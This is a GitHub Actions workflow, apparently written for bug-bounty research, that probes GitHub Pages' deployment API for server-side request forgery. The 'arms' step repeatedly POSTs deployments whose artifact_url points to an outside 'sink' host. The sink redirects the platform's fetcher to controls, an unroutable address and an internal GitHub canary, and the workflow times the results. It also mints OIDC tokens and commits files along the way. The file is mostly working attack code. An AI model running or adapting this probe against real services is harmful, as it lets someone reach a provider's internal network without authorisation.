name: reacharm9
on:
  workflow_dispatch:
    inputs:
      sink: { required: true }
permissions: { contents: write, pages: write, id-token: write, actions: write }
jobs:
  probe:
    runs-on: ubuntu-latest
    environment: { name: github-pages }
    steps:
      - run: mkdir -p s && echo '<h1>ok</h1>' > s/index.html && tar -czf art.tar.gz -C s .
      - uses: actions/upload-artifact@v4
        with: { name: f1, path: art.tar.gz }
      - uses: actions/upload-artifact@v4
        with: { name: f2, path: art.tar.gz }
      - uses: actions/upload-artifact@v4
        with: { name: f3, path: art.tar.gz }
      - uses: actions/upload-artifact@v4
        with: { name: f4, path: art.tar.gz }
      - uses: actions/upload-artifact@v4
        with: { name: f5, path: art.tar.gz }
      - name: arms
        env:
          GH_TOKEN: ${{ github.token }}
          SINK: ${{ inputs.sink }}
        run: |
          set -u
          R=$GITHUB_REPOSITORY; A=https://api.github.com
          API="$A/repos/$R/pages/deployments"
          H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
          echo "PRECONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/ctrl?pre9")"
          curl -s "${H[@]}" "$A/repos/$R/actions/runs/$GITHUB_RUN_ID/artifacts" > arts.json
          gid(){ jq -r --arg n "$1" '.artifacts[]|select(.name==$n).id' arts.json; }
          mk(){ curl -s "${H[@]}" -X PUT "$A/repos/$R/contents/m9/$1-$RANDOM.txt" \
                 -d "$(jq -nc --arg m "m $1" --arg c "$(echo -n "$1-$GITHUB_RUN_ID-$RANDOM"|base64 -w0)" '{message:$m,content:$c}')" \
                 | jq -r '.commit.sha'; }
          # EVERY arm is anchored at OUR SINK, which 302s to the arm's real target.
          # The sink therefore timestamps hop 1 for every arm identically -> Delta = terminal - hop1.
          arm(){ # $1=label $2=artifact $3=armid
            echo "===== $1 armid=$3 ====="
            C=000
            for try in 1 2 3 4 5 6 7 8; do
              TK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
              jq -nc --argjson id "$(gid $2)" --arg u "$SINK/arm/$3" --arg s "$(mk $1)" --arg t "$TK" \
                '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > x.json
              C=$(curl -s -o x.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @x.json)
              [ "$C" = "200" ] && break
              echo "$1 POST=$C try=$try :: $(jq -r '.message//"?"' x.out | head -c 70)"; sleep 25
            done
            if [ "$C" != "200" ]; then echo "$1 RESULT=NOT_DISPATCHED"; return; fi
            echo "$1 POST=200 DEPLOY=$(jq -r '.id' x.out) POSTED_AT=$(date +%s.%N)"
            SU=$(jq -r '.status_url//empty' x.out)
            # POLL CAP FIXED: 300 iters x 2s = 600s (was 75 x 2s = 150s, which CENSORED the REALNET arm).
            for i in $(seq 1 300); do sleep 2
              S=$(curl -s "${H[@]}" "$SU" | jq -r '.status')
              case "$S" in deployment_in_progress|deployment_queued|null|"") ;;
                *) echo "$1 RESULT=$S TERMINAL_AT=$(date +%s.%N) CENSORED=no"; return;; esac
            done
            echo "$1 RESULT=OVER600 TERMINAL_AT=$(date +%s.%N) CENSORED=YES"; }

          # D FIRST: positive control. Sink 302s to the sink itself -> a hop2 line proves
          # the fetcher FOLLOWS the redirect at all. Without it every silence is uninterpretable.
          arm REDIRCTL  f1 D
          # NXDOMAIN served by OUR OWN authoritative NS (ionash.com is ours; no wildcard, verified).
          arm NXDOM_OUR f2 B
          # RFC5737 TEST-NET-1: resolves nowhere routable -> connect hangs. Isolates connect-timeout.
          arm DROP      f3 C
          # VENDOR-AUTHORISED CANARY. targets/github-net.html: "You may use ssrf-target.iad.github.net
          # to test out SSRF attacks." GET only, path that cannot exist, no datastore.
          arm CANARY    f4 A
          # E: control repeated at the END, bracketing the run like a pre/post sink control.
          arm REDIRCTL2 f5 E
          echo "POSTCONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/ctrl?post9")"
